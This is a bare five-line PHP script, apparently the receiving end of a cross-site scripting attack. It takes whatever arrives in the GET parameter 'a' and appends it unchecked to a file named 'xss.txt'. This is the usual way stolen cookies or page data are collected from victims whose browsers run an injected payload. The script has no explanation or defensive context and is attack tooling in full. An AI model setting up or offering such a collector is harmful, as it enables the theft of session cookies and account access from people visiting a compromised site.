<?php
	$fp = fopen("xss.txt","a+");
	fwrite($fp,$_GET['a']);
	fclose($fp);
?>